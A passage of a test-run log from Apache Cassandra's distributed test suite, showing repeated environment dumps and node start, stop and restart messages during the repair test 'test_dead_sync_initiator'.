00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node2/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:01 23:32:01,442 ccm INFO node2: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node2/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node2/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:01 23:32:01,443 ccm INFO node2: using Java 8 for the current invocation
01:32:01 23:32:01,443 ccm INFO node2: using Java 8 for the current invocation
01:32:01 23:32:01,497 ccm INFO Starting node2 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:01 23:32:01,497 ccm INFO Starting node2 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:01 23:32:01,704 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/conf'}
01:32:01 23:32:01,704 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/conf'}
01:32:01 23:32:01,705 ccm INFO node3: using Java 8 for the current invocation
01:32:01 23:32:01,705 ccm INFO node3: using Java 8 for the current invocation
01:32:01 23:32:01,850 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:01 23:32:01,850 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-bl2lczc6/test/node3/conf', 'CASSANDRA_LIBJEMALLOC': '-', 'JVM_EXTRA_OPTS': ' -Djdk.attach.allowAttachSelf=true -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6 -Dcassandra.migration_task_wait_in_seconds=6'}
01:32:01 23:32:01,851 ccm INFO node3: using Java 8 for the current invocation
01:32:01 23:32:01,851 ccm INFO node3: using Java 8 for the current invocation
01:32:01 23:32:01,946 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:01 23:32:01,946 ccm INFO Starting node3 with JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 java_version=8 cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra
01:32:01 23:32:19,565 repair_tests.repair_test DEBUG stopping node3
01:32:19 23:32:33,649 cassandra.cluster INFO New Cassandra host <Host: 127.0.0.3:9042 datacenter1> discovered
01:32:33 23:32:33,650 cassandra.cluster INFO New Cassandra host <Host: 127.0.0.2:9042 datacenter1> discovered
01:32:33 23:32:33,694 repair_tests.repair_test DEBUG inserting data while node3 is down
01:32:33 23:32:44,18 repair_tests.repair_test DEBUG bring back node3
01:32:44 23:32:44,127 ccm INFO node3: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': '717f59bdf476', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 